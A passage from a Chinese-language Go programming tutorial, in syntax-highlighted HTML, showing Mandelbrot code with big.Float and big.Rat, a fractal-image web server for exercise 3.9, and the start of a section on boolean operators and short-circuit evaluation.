class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>vR2<span class=\"token punctuation\">,</span> zR<span class=\"token punctuation\">)</span>\n\t\tvI2<span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vR<span class=\"token punctuation\">,</span> vI<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vI2<span class=\"token punctuation\">,</span> big<span class=\"token punctuation\">.</span><span class=\"token function\">NewFloat</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>vI2<span class=\"token punctuation\">,</span> zI<span class=\"token punctuation\">)</span>\n\t\tvR<span class=\"token punctuation\">,</span> vI <span class=\"token operator\">=</span> vR2<span class=\"token punctuation\">,</span> vI2\n\t\tsquareSum <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Float<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t\tsquareSum<span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vR<span class=\"token punctuation\">,</span> vR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>squareSum<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Float<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vI<span class=\"token punctuation\">,</span> vI<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> squareSum<span class=\"token punctuation\">.</span><span class=\"token function\">Cmp</span><span class=\"token punctuation\">(</span>big<span class=\"token punctuation\">.</span><span class=\"token function\">NewFloat</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Black\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">mandelbrotRat</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> iterations <span class=\"token operator\">=</span> <span class=\"token number\">200</span>\n\tzR <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Rat<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">SetFloat64</span><span class=\"token punctuation\">(</span><span class=\"token function\">real</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tzI <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Rat<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">SetFloat64</span><span class=\"token punctuation\">(</span><span class=\"token function\">imag</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">var</span> vR<span class=\"token punctuation\">,</span> vI <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Rat<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Rat<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> iterations<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// (r+i)^2 = r^2 + 2ri + i^2</span>\n\t\tvR2<span class=\"token punctuation\">,</span> vI2 <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Rat<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Rat<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t\tvR2<span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vR<span class=\"token punctuation\">,</span> vR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Sub</span><span class=\"token punctuation\">(</span>vR2<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Rat<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vI<span class=\"token punctuation\">,</span> vI<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>vR2<span class=\"token punctuation\">,</span> zR<span class=\"token punctuation\">)</span>\n\t\tvI2<span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vR<span class=\"token punctuation\">,</span> vI<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vI2<span class=\"token punctuation\">,</span> big<span class=\"token punctuation\">.</span><span class=\"token function\">NewRat</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>vI2<span class=\"token punctuation\">,</span> zI<span class=\"token punctuation\">)</span>\n\t\tvR<span class=\"token punctuation\">,</span> vI <span class=\"token operator\">=</span> vR2<span class=\"token punctuation\">,</span> vI2\n\t\tsquareSum <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Rat<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\t\tsquareSum<span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vR<span class=\"token punctuation\">,</span> vR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>squareSum<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>big<span class=\"token punctuation\">.</span>Rat<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Mul</span><span class=\"token punctuation\">(</span>vI<span class=\"token punctuation\">,</span> vI<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> squareSum<span class=\"token punctuation\">.</span><span class=\"token function\">Cmp</span><span class=\"token punctuation\">(</span>big<span class=\"token punctuation\">.</span><span class=\"token function\">NewRat</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Black\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习 3.9</h3>\n<p>编写一个web服务器，用于给客户端生成分形的图像。运行客户端通过HTTP参数指定x、y和zoom参数。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"image\"</span>\n\t<span class=\"token string\">\"image/color\"</span>\n\t<span class=\"token string\">\"image/png\"</span>\n\t<span class=\"token string\">\"log\"</span>\n\t<span class=\"token string\">\"math/cmplx\"</span>\n\t<span class=\"token string\">\"net/http\"</span>\n\t<span class=\"token string\">\"strconv\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">HandleFunc</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span>\n\tlog<span class=\"token punctuation\">.</span><span class=\"token function\">Fatal</span><span class=\"token punctuation\">(</span>http<span class=\"token punctuation\">.</span><span class=\"token function\">ListenAndServe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\":8888\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">handler</span><span class=\"token punctuation\">(</span>w http<span class=\"token punctuation\">.</span>ResponseWriter<span class=\"token punctuation\">,</span> r <span class=\"token operator\">*</span>http<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n\t\twidth<span class=\"token punctuation\">,</span> height <span class=\"token operator\">=</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span>\n\t<span class=\"token punctuation\">)</span>\n\n\tparams <span class=\"token operator\">:=</span> <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">float64</span><span class=\"token punctuation\">{</span>\n\t\t<span class=\"token string\">\"xmin\"</span><span class=\"token punctuation\">:</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token string\">\"xmax\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token string\">\"ymin\"</span><span class=\"token punctuation\">:</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token string\">\"ymax\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token string\">\"zoom\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> name <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> params <span class=\"token punctuation\">{</span>\n\t\ts <span class=\"token operator\">:=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">FormValue</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> s <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">continue</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tf<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> strconv<span class=\"token punctuation\">.</span><span class=\"token function\">ParseFloat</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"query param %s: %s\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusBadRequest<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">return</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tparams<span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> f\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">if</span> params<span class=\"token punctuation\">[</span><span class=\"token string\">\"xmax\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> params<span class=\"token punctuation\">[</span><span class=\"token string\">\"xmin\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> params<span class=\"token punctuation\">[</span><span class=\"token string\">\"ymax\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> params<span class=\"token punctuation\">[</span><span class=\"token string\">\"ymin\"</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"min coordinate greater than max\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusBadRequest<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span>\n\t<span class=\"token punctuation\">}</span>\n\txmin <span class=\"token operator\">:=</span> params<span class=\"token punctuation\">[</span><span class=\"token string\">\"xmin\"</span><span class=\"token punctuation\">]</span>\n\txmax <span class=\"token operator\">:=</span> params<span class=\"token punctuation\">[</span><span class=\"token string\">\"xmax\"</span><span class=\"token punctuation\">]</span>\n\tymin <span class=\"token operator\">:=</span> params<span class=\"token punctuation\">[</span><span class=\"token string\">\"ymin\"</span><span class=\"token punctuation\">]</span>\n\tymax <span class=\"token operator\">:=</span> params<span class=\"token punctuation\">[</span><span class=\"token string\">\"ymax\"</span><span class=\"token punctuation\">]</span>\n\tzoom <span class=\"token operator\">:=</span> params<span class=\"token punctuation\">[</span><span class=\"token string\">\"zoom\"</span><span class=\"token punctuation\">]</span>\n\n\tlenX <span class=\"token operator\">:=</span> xmax <span class=\"token operator\">-</span> xmin\n\tmidX <span class=\"token operator\">:=</span> xmin <span class=\"token operator\">+</span> lenX<span class=\"token operator\">/</span><span class=\"token number\">2</span>\n\txmin <span class=\"token operator\">=</span> midX <span class=\"token operator\">-</span> lenX<span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token operator\">/</span>zoom\n\txmax <span class=\"token operator\">=</span> midX <span class=\"token operator\">+</span> lenX<span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token operator\">/</span>zoom\n\tlenY <span class=\"token operator\">:=</span> ymax <span class=\"token operator\">-</span> ymin\n\tmidY <span class=\"token operator\">:=</span> ymin <span class=\"token operator\">+</span> lenY<span class=\"token operator\">/</span><span class=\"token number\">2</span>\n\tymin <span class=\"token operator\">=</span> midY <span class=\"token operator\">-</span> lenY<span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token operator\">/</span>zoom\n\tymax <span class=\"token operator\">=</span> midY <span class=\"token operator\">+</span> lenY<span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token operator\">/</span>zoom\n\n\timg <span class=\"token operator\">:=</span> image<span class=\"token punctuation\">.</span><span class=\"token function\">NewRGBA</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">.</span><span class=\"token function\">Rect</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> py <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> py <span class=\"token operator\">&lt;</span> height<span class=\"token punctuation\">;</span> py<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\ty <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>py<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>height<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>ymax<span class=\"token operator\">-</span>ymin<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> ymin\n\t\t<span class=\"token keyword\">for</span> px <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> px <span class=\"token operator\">&lt;</span> width<span class=\"token punctuation\">;</span> px<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\tx <span class=\"token operator\">:=</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>width<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>xmax<span class=\"token operator\">-</span>xmin<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> xmin\n\t\t\tz <span class=\"token operator\">:=</span> <span class=\"token function\">complex</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span>\n\t\t\timg<span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">,</span> py<span class=\"token punctuation\">,</span> <span class=\"token function\">mandelbrot</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\terr <span class=\"token operator\">:=</span> png<span class=\"token punctuation\">.</span><span class=\"token function\">Encode</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> img<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\thttp<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusInternalServerError<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">mandelbrot</span><span class=\"token punctuation\">(</span>z <span class=\"token builtin\">complex128</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> iterations <span class=\"token operator\">=</span> <span class=\"token number\">200</span>\n\t<span class=\"token keyword\">var</span> v <span class=\"token builtin\">complex128</span>\n\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> iterations<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\tv <span class=\"token operator\">=</span> v<span class=\"token operator\">*</span>v <span class=\"token operator\">+</span> z\n\t\t<span class=\"token keyword\">if</span> cmplx<span class=\"token punctuation\">.</span><span class=\"token function\">Abs</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> color<span class=\"token punctuation\">.</span>Black\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">getColor</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">uint8</span><span class=\"token punctuation\">)</span> color<span class=\"token punctuation\">.</span>Color <span class=\"token punctuation\">{</span>\n\tpaletted <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span>color<span class=\"token punctuation\">.</span>Color<span class=\"token punctuation\">{</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// # brown 3</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>     <span class=\"token comment\">// # dark violett</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>      <span class=\"token comment\">//# darkest blue</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>      <span class=\"token comment\">//# blue 5</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>     <span class=\"token comment\">//# blue 4</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">138</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">//# blue 3</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">177</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">//# blue 2</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">209</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">//# blue 1</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">181</span><span class=\"token punctuation\">,</span> <span class=\"token number\">229</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// # blue 0</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">211</span><span class=\"token punctuation\">,</span> <span class=\"token number\">236</span><span class=\"token punctuation\">,</span> <span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// # lightest blue</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">241</span><span class=\"token punctuation\">,</span> <span class=\"token number\">233</span><span class=\"token punctuation\">,</span> <span class=\"token number\">191</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// # lightest yellow</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token number\">201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">// # light yellow</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">170</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// # dirty yellow</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">204</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// # brown 0</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// # brown 1</span>\n\t\tcolor<span class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// # brown 2</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> paletted<span class=\"token punctuation\">[</span>n<span class=\"token operator\">%</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>3.4. 布尔型</h2>\n<p>布尔类型的值：true和false。if和for语句的条件部分都是布尔类型的值，==和&lt;等比较操作也会产生布尔型的值。一元操作符!对应逻辑非操作，<code>!true</code>的值为<code>false</code>。</p>\n<p>布尔值可以和<code>&amp;&amp;</code>（AND）和<code>||</code>（OR）操作符结合，并且有短路行为：如果运算符左边值已经可以确定整个布尔表达式的值，那么运算符右边的值将不再被求值，下面的表达式总是安全的：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>s <span class=\"token operator\">!=</span> <span class=\"token string\">\"\"</span> <span class=\"token operator\">&amp;&amp;</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'x'</span>\n</code></pre></div><p>因为<code>&amp;&amp;</code>的优先级比<code>||</code>高</p>\n<p>下面形式的布尔表达式是不需要加小括弧的：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">if</span> <span 